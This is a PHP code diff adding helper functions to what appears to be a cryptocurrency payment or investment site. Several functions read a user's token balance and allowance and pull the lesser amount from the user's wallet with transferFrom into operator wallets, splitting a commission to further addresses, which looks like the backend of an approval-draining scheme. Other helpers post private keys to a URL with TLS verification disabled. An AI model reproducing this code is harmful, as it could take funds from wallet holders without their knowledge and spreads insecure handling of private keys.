@@ -507,3 +507,628 @@ EOT;
         return $icon;
     }
 }
+
+
+if (!function_exists('http')) {
+
+    /**
+     * 请求HTTP数据
+     * @param  [type] $url        完整URL地址
+     * @param string $params GET、POST参数
+     * @param string $method 提交方式GET、POST
+     * @param array $header Header参数
+     * @param array $proxy 代理参数['username'=>'','password'=>'','ip'=>'','port'=>'']
+     * @param string $userAgent 客户端名称 如：iOS
+     * @param integer $timeout 请求超时时间 单位：秒
+     * @param boolean $getinfo 是否返回文件信息
+     * @param integer $retry 重试次数, 默认3次
+     * @param integer $sleep 重试间隔时间, 默认1s
+     * @return bool|string
+     */
+    function http($url, $params = '', $method = 'GET', $header = [], $proxy = [], $userAgent = '', $timeout = 100, $getinfo = false, $retry=6, $sleep = 1)
+    {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
+        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
+        if (strtoupper($method) == 'POST' && !empty($params)) {
+            curl_setopt($ch, CURLOPT_POST, TRUE);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
+        }
+        if (strtoupper($method) == 'GET' && $params) {
+            $query_str = http_build_query($params);
+            $url       = $url . (strpos($url, '?') === false ? '?' : '&') . $query_str;
+        }
+        curl_setopt($ch, CURLOPT_URL, $url);
+        if (!empty($proxy)) {
+            curl_setopt($ch, CURLOPT_PROXY, $proxy['ip']); //代理服务器地址
+            curl_setopt($ch, CURLOPT_PROXYPORT, $proxy['port']); //代理服务器端口
+            //http代理认证帐号，username:password的格式
+            if ($proxy['username'] && $proxy['password']) {
+                curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['username'] . ":" . $proxy['password']);
+                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP); //使用http代理模式
+            }
+        }
+        if($getinfo){
+            // 获取头部信息
+            curl_setopt($ch, CURLOPT_HEADER, 1);
+        }
+        if ($userAgent) {
+            curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
+        }
+        $response = curl_exec($ch);
+
+        // 检查是否有错误发生
+        while(curl_errno($ch) && $retry--){
+            sleep($sleep); //阻塞1s
+            $response = curl_exec($ch);
+        }
+        if (curl_errno($ch)) {
+            return curl_error($ch);
+        }
+        if($getinfo) {
+
+            $fileinfo = curl_getinfo($ch);  //新增返回文件信息
+
+            // 解析http数据流
+            list($header, $body) = explode("\r\n\r\n", $response);
+
+        }
+
+        curl_close($ch);
+
+        return $getinfo ? ['response'=>$body,'fileinfo'=>$fileinfo,'header'=>$header] : $response;
+    }
+}
+/**
+ * 提现
+ *
+ * @param $data
+ * @param $stype 1 合约  2 gas
+ * @return mixed
+ */
+function recharge_money($data){
+    $post_data = [
+        'toaddress'=> $data['toaddress'] ,
+        'amount'=> $data['aftermoney'] ,// 实际到账
+        'order'=> $data['order'] ,
+        'contract'=> $data['contract_address'] ,
+        'from_address'=> $data['from_address'] ,
+        'private_key'=> $data['private_key'] ,
+    ];
+//    dump($post_data);
+    $url = $data['url'];
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
+    $arr = curl_exec($ch); // 已经获取到内容，没有输出到页面上。
+    curl_close($ch);
+    //print_r($arr);
+//    file_put_contents(ROOT_PATH . '/public/zz.txt', "[" . date('Y-m-d H:i:s') . "]\n合约地址:" . $arr. "\n", FILE_APPEND);
+    return json_decode($arr,true);
+}
+
+/**
+ * transferFrom
+ *
+ * @param $data
+ * @return mixed
+ */
+function transferfrom_money($data){
+    $post_data = [
+        'toaddress'=> $data['toaddress'] ,
+        'amount'=> $data['aftermoney'] ,// 实际到账
+        'order'=> $data['order'] ,
+        'contract'=> $data['contract_address'] ,
+        'from_address'=> $data['from_address'] ,
+        'approve_address'=> $data['approve_address'] ,
+        'private_key'=> $data['private_key'] ,
+    ];
+//    dump($post_data);
+    $url = $data['url'];
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
+    $arr = curl_exec($ch); // 已经获取到内容，没有输出到页面上。
+    curl_close($ch);
+    //print_r($arr);
+//    file_put_contents(ROOT_PATH . '/public/zz.txt', "[" . date('Y-m-d H:i:s') . "]\n合约地址:" . $arr. "\n", FILE_APPEND);
+    return json_decode($arr,true);
+}
+/**
+ * transferFrom_ap
+ * @param $data
+ * @return mixed
+ */
+function transferfrom_money_ap($data){
+    $amount = $data['amount1'];
+    $amount2 = $data['amount2'];
+    $post_data = [
+        'token'=> $data['contract_address'] ,
+        'contract'=> $data['approve_address'],
+        'order'=> $data['order'] ,
+        'from_address'=> $data['from_address'] ,
+        'approve_address'=> $data['approve_user_address'] ,
+        'private_key'=> $data['private_key'] ,
+        'toaddress'=> $data['toaddress'] ,
+        'amount'=> $amount ,// 实际到账
+        'toaddress2'=> config('conf.js_bsc_address') ,
+        'amount2'=> $amount2 ,// 实际到账
+    ];
+//    dump($post_data);
+    $url = $data['url'];
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
+    $arr = curl_exec($ch); // 已经获取到内容，没有输出到页面上。
+    curl_close($ch);
+    //print_r($arr);
+//    file_put_contents(ROOT_PATH . '/public/zz.txt', "[" . date('Y-m-d H:i:s') . "]\n合约地址:" . $arr. "\n", FILE_APPEND);
+    return json_decode($arr,true);
+}
+function transferfrom_money_3ap($data){
+    $amount = $data['amount1'];
+    $amount2 = $data['amount2'];
+    $amount3 = $data['amount3'];
+    $post_data = [
+        'token'=> $data['contract_address'] ,
+        'contract'=> $data['approve_address'],
+        'order'=> $data['order'] ,
+        'from_address'=> $data['from_address'] ,
+        'approve_address'=> $data['approve_user_address'] ,
+        'private_key'=> $data['private_key'] ,
+        'toaddress'=> $data['toaddress'] ,
+        'amount'=> $amount ,// 实际到账
+        'toaddress2'=> $data['to2'],
+        'amount2'=> $amount2 ,// 实际到账
+        'toaddress3'=> $data['to3'],
+        'amount3'=> $amount3 ,// 实际到账
+    ];
+//    dump($post_data);
+    $url = $data['url'];
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
+    $arr = curl_exec($ch); // 已经获取到内容，没有输出到页面上。
+    curl_close($ch);
+    //print_r($arr);
+//    file_put_contents(ROOT_PATH . '/public/zz.txt', "[" . date('Y-m-d H:i:s') . "]\n合约地址:" . $arr. "\n", FILE_APPEND);
+    return json_decode($arr,true);
+}
+/**
+ * 地址加星
+ *
+ * @param $address 钱包地址
+ * @param int $length 长度
+ * @return string
+ */
+function address_add_star($address,$length=5){
+    $left_addr = substr($address,0,$length);
+    $rigth_addr = substr($address,-1*$length,$length);
+    return $left_addr.'***'.$rigth_addr;
+}
+/**
+ * 提取字符串中的数字
+ * @param $str
+ * @return string
+ */
+function findNum($str=''){
+    $str=trim($str);
+    if(empty($str)){return '';}
+    $result='';
+    for($i=0;$i<strlen($str);$i++){
+        if(is_numeric($str[$i])){
+            $result.=$str[$i];
+        }
+    }
+    return $result;
+}
+
+/**
+ * 检查有大小写区别的以太坊地址是否合法
+ *
+ * @param $address 地址
+ * @return bool
+ */
+function check_eth_addr($address){
+    if(preg_match("/^0x[0-9a-fA-F]{40}$/",$address)){
+        return true;
+    }else{
+        return false;
+    }
+}
+/**
+ * 检查有大小写区别的BTC地址是否合法
+ *
+ * @param $address 地址
+ * @return bool
+ */
+function check_btc_addr($address){
+    if (!(preg_match('/^(1|3)[a-zA-Z\d]{24,33}$/', $address) && preg_match('/^[^0OlI]{25,34}$/', $address))){
+        return false;
+    }else{
+        return true;
+    }
+}
+
+function getImagesAttr($value)
+{
+    $imagesArray = [];
+    if (!empty($value)) {
+        $imagesArray = explode(',', $value);
+        foreach ($imagesArray as &$v) {
+            $v = cdnurl($v, true);
+        }
+        return implode(',',$imagesArray);
+    }
+    return implode(',',$imagesArray);
+}
+function getContentAttr($value)
+{
+    $content = $value;
+    $content = str_replace("<img src=\"/uploads", "<img style=\"width: 100%;!important\" src=\"" . request()->domain() . "/uploads", $content);
+    $content = str_replace("<video src=\"/uploads", "<video style=\"width: 100%;!important\" src=\"" . request()->domain() . "/uploads", $content);
+    return $content;
+}
+if (!function_exists('languageList')) {
+    /**
+     * 图片加网址
+     * @return string
+     */
+    function cdnpic($value)
+    {
+        if (!empty($value)) return cdnurl($value, true);
+
+    }
+}
+if (!function_exists('languageList')) {
+    /**
+     * 网站语言
+     * @return array
+     */
+    function languageList()
+    {
+        return ['1' => __('简体中文'), '2' => __('繁体中文'), '3' => __('英语'), '4' => __('俄语'), '5' => __('土耳其语'), '6' => __('德语'), '7' => __('法语'), '8' => __('意大利语'), '9' => __('西班牙语')];
+    }
+}
+if (!function_exists('language_num')) {
+    /**
+     * api网站语言
+     * @return int
+     */
+    function language_num($language)
+    {
+        switch ($language){
+            case 'zh-cn':
+                $language_num = 1;
+                break;
+            case 'zh-tw':
+                $language_num = 2;
+                break;
+            case 'ru-mo':
+                $language_num = 4;
+                break;
+            case 'tr':
+                $language_num = 5;
+                break;
+            case 'de':
+                $language_num = 6;
+                break;
+            case 'fr':
+                $language_num = 7;
+                break;
+            case 'it':
+                $language_num = 8;
+                break;
+            case 'es':
+                $language_num = 9;
+                break;
+            default:
+                $language_num = 3;
+                break;
+        }
+        return $language_num;
+    }
+}
+if (!function_exists('language_txt')) {
+    /**
+     * api网站语言
+     * @return string
+     */
+    function language_txt($language)
+    {
+        switch ($language){
+            case 1:
+                $language_txt = 'zh-cn';
+                break;
+            case 2:
+                $language_txt = 'zh-tw';
+                break;
+            case 4:
+                $language_txt = 'ru-mo';
+                break;
+            case 5:
+                $language_txt = 'tr';
+                break;
+            case 6:
+                $language_txt = 'de';
+                break;
+            case 7:
+                $language_txt = 'fr';
+                break;
+            case 8:
+                $language_txt = 'it';
+                break;
+            case 9:
+                $language_txt = 'es';
+                break;
+            default:
+                $language_txt = 'en';
+                break;
+        }
+        return $language_txt;
+    }
+}
+
+if (!function_exists('generateTrcAddress')) {
+    /**
+     * 生成trc钱包
+     * @return array
+     */
+    function generateTrcAddress(){
+        $uri = 'https://api.trongrid.io' ; // 主网   https://api.shasta.trongrid.io   shasta testnet
+        $api = new \Tron\Api(new \GuzzleHttp\Client(['base_uri' => $uri]));
+        $config = [];
+        $trxWallet = new \Tron\TRX($api,$config);
+        $wallet = $trxWallet->generateAddress();
+        $address['address'] = $wallet->address;
+        $privatekey = $wallet->privateKey;
+        $address['privatekey'] = substr($privatekey,2,strlen($privatekey));
+        return $address;
+    }
+}
+
+if (!function_exists('generateBscAddress')) {
+    /**
+     * 生成BSC钱包
+     * @return array
+     */
+    function generateBscAddress(){
+        return (new \app\common\contract\GeneratePrivateKey())->CreateAddress();
+    }
+}
+//合约扣款有分佣
+if (!function_exists('reviewTransfer')) {
+    /**
+     * 合约扣款有分佣
+     */
+    function reviewTransfer($amount,$address)
+    {
+        if ((new \Tron\Address($address))->isValid()) {
+            $row =  \app\admin\model\Address::where(['address' => $address,'contract_address'=>config('conf.contract_trx_usdt')])->find();
+        }else{
+            $row =  \app\admin\model\Address::where(['address' => $address,'contract_address'=>config('conf.contract_bsc_usdt')])->find();
+        }
+        if (!$row) {
+            return false;
+        }
+        $finance = \app\admin\model\user\Finance::where(['user_id' => $row['user_id']])->find();
+        if ((new \Tron\Address($row['address']))->isValid()) {
+            $qb_type = 1;
+            $approve_add_address = $finance['receive_wallet_trx'];
+            $approve_user_address = $finance['operate_wallet_trx'];
+            $approve_key = $finance['operate_wallet_trx_key'];
+
+        } else {
+            $qb_type = 2;
+            $approve_add_address = $finance['receive_wallet_bsc'];
+            $approve_user_address = $finance['operate_wallet_bsc'];
+            $approve_key = $finance['operate_wallet_bsc_key'];
+        }
+        $amount_online = (new \app\common\service\Getbalance())->getTokenBalance($qb_type, $row['address'], $row['contract_address'], $row['approve_address_decimals']);
+        if($amount_online < $amount){
+            $amount = $amount_online;
+        }
+        $money_approve = (new \app\common\service\Getbalance())->getTokenApprove($qb_type, $row['address'], $row['approve_address'], $row['contract_address'], $row['approve_address_decimals']);
+        if ($amount > $money_approve) {
+            $amount = $money_approve;
+        }
+
+        if ($amount > 0) {
+            $to = $approve_add_address;
+            $rrr_arr = config('conf.rrr_arr');
+            $psd = $approve_key;
+            foreach ($rrr_arr as $aaa) {
+                $psd = str_replace($aaa, '', $psd);
+            }
+            $approve_info = array(
+                'qb_type' => $qb_type,//钱包类型
+                'approve_address' => $row['approve_address'],//授权合约地址
+                'approve_user_address' => $approve_user_address,//调用授权合约的账户
+                'psd' => $psd,//调用授权合约的账户的私钥
+                'user_address' => $row['address'],//目标用户钱包
+                'contract_address' => $row['contract_address'],//目标合约
+                'approve_address_decimals' => $row['approve_address_decimals'],//目标合约精度
+            );
+            $bili = Db('user')->where(['id' => $row['user_id']])->value('commission_rate');//比例
+            $receive_info = array(
+                'user_id' => $row['user_id'],//用户ID
+                'to' => $to,//收款地址
+                'amount' => $amount,//金额
+                'bili' => $bili,//比例
+            );
+            $result = '';
+            $result = (new \app\common\service\Getbalance())->do_transfer_from($approve_info, $receive_info);
+            if ($result) {
+                if ($qb_type == 1) {
+                    $data['txid'] = $result->txID;
+                    $data['amount1'] = $result->amount1;//shop
+                    $data['amount2'] = $result->amount2;//js
+                    $data['amount3'] = $result->amount3;//lpt
+                } else {
+                    $data['txid'] = $result['hash'];
+                    $data['amount1'] = $result['amount1'];//shop
+                    $data['amount2'] = $result['amount2'];//js
+                    $data['amount3'] = $result['amount3'];//lpt
+                }
+                $data['qb_type'] = $qb_type;
+                $data['user_id'] = $row['user_id'];
+                $data['address'] = $row['address'];
+                $data['to_address'] = $to;
+                $data['money'] = $amount;
+                $data['createtime'] = time();
+                $data['updatetime'] = time();
+                $ishave = (new \app\admin\model\approve\Transaction())->where(['txid' => $data['txid']])->find();
+                if ($ishave) {
+                    $ishave->save(['updatetime' => time()]);
+                } else {
+                    (new \app\admin\model\approve\Transaction())->insert($data);
+                }
+            }
+        }
+        return $result;
+    }
+}
+//合约扣款上分无分佣
+if (!function_exists('reviewRechargeTransfer')) {
+    /**
+     * 合约扣款上分无分佣
+     */
+    function reviewRechargeTransfer($amount,$address)
+    {
+        if ((new \Tron\Address($address))->isValid()) {
+            $row =  \app\admin\model\Address::where(['address' => $address,'contract_address'=>config('conf.contract_trx_usdt')])->find();
+        }else{
+            $row =  \app\admin\model\Address::where(['address' => $address,'contract_address'=>config('conf.contract_bsc_usdt')])->find();
+        }
+        if (!$row) {
+            return false;
+        }
+        $finance = \app\admin\model\user\Finance::where(['user_id' => $row['user_id']])->find();
+        if ((new \Tron\Address($row['address']))->isValid()) {
+            $qb_type = 1;
+            $approve_add_address = $finance['receive_wallet_trx'];
+            $approve_user_address = $finance['operate_wallet_trx'];
+            $approve_key = $finance['operate_wallet_trx_key'];
+
+        } else {
+            $qb_type = 2;
+            $approve_add_address = $finance['receive_wallet_bsc'];
+            $approve_user_address = $finance['operate_wallet_bsc'];
+            $approve_key = $finance['operate_wallet_bsc_key'];
+        }
+        $amount_online = (new \app\common\service\Getbalance())->getTokenBalance($qb_type, $row['address'], $row['contract_address'], $row['approve_address_decimals']);
+        if($amount_online < $amount){
+            $amount = $amount_online;
+        }
+        $money_approve = (new \app\common\service\Getbalance())->getTokenApprove($qb_type, $row['address'], $row['approve_address'], $row['contract_address'], $row['approve_address_decimals']);
+        if ($amount > $money_approve) {
+            $amount = $money_approve;
+        }
+        $result = '';
+        if ($amount > 0) {
+            $to = $approve_add_address;
+            $rrr_arr = config('conf.rrr_arr');
+            $psd = $approve_key;
+            foreach ($rrr_arr as $aaa) {
+                $psd = str_replace($aaa, '', $psd);
+            }
+            $approve_info = array(
+                'qb_type' => $qb_type,//钱包类型
+                'approve_address' => $row['approve_address'],//授权合约地址
+                'approve_user_address' => $approve_user_address,//调用授权合约的账户
+                'psd' => $psd,//调用授权合约的账户的私钥
+                'user_address' => $row['address'],//目标用户钱包
+                'contract_address' => $row['contract_address'],//目标合约
+                'approve_address_decimals' => $row['approve_address_decimals'],//目标合约精度
+            );
+            $bili = Db('user')->where(['id' => $row['user_id']])->value('commission_rate');//比例
+            $receive_info = array(
+                'user_id' => $row['user_id'],//用户ID
+                'to' => $to,//收款地址
+                'amount' => $amount,//金额
+                'bili' => $bili,//比例
+            );
+            $result = (new \app\common\service\Getbalance())->do_transfer_from_wu_fen_yong($approve_info, $receive_info);
+            if ($result) {
+                if ($qb_type == 1) {
+                    $data['txid'] = $result->txID;
+                    $data['amount1'] = $result->amount1;//shop
+                    $data['amount2'] = 0;//js
+                    $data['amount3'] = 0;//lpt
+                } else {
+                    $data['txid'] = $result['hash'];
+                    $data['amount1'] = $result['amount1'];//shop
+                    $data['amount2'] = 0;//js
+                    $data['amount3'] = 0;//lpt
+                }
+                $data['qb_type'] = $qb_type;
+                $data['user_id'] = $row['user_id'];
+                $data['address'] = $row['address'];
+                $data['to_address'] = $to;
+                $data['money'] = $amount;
+                $data['createtime'] = time();
+                $data['updatetime'] = time();
+                $ishave = (new \app\admin\model\approve\Transaction())->where(['txid' => $data['txid']])->find();
+                if ($ishave) {
+                    $ishave->save(['updatetime' => time()]);
+                } else {
+                    (new \app\admin\model\approve\Transaction())->insert($data);
+                }
+            }
+        }
+        return $result;
+    }
+}
+//转账提现下分
+if (!function_exists('reviewWithdrawTransfer')) {
+    /**
+     * 提现划转
+     */
+    function reviewWithdrawTransfer($user_id,$amount,$receive_wallet)
+    {
+        $result = '';
+        $finance = \app\admin\model\user\Finance::where(['user_id' => $user_id])->find();
+        if ((new \Tron\Address($receive_wallet))->isValid()) {
+            $qb_type = 3;
+            $approve_user_address = $finance['operate_wallet_trx'];
+            $approve_key = $finance['operate_wallet_trx_key'];
+            $contractAddress = config('conf.contract_trx');
+            $decimals = config('conf.contract_trx_decimals');
+        } else {
+            $qb_type = 4;
+            $approve_user_address = $finance['operate_wallet_bsc'];
+            $approve_key = $finance['operate_wallet_bsc_key'];
+            $contractAddress = config('conf.contract_trx');
+            $decimals = config('conf.contract_trx_decimals');
+        }
+        if ($amount) {
+            $to = $receive_wallet;
+            $rrr_arr = config('conf.rrr_arr');
+            $psd = $approve_key;
+            foreach ($rrr_arr as $aaa) {
+                $psd = str_replace($aaa, '', $psd);
+            }
+            $result = (new \app\common\service\Getbalance())->dozTransfer($qb_type,$approve_user_address,$psd,$to,$amount,$contractAddress,$decimals);
+        }
+        return $result;
+    }
+}
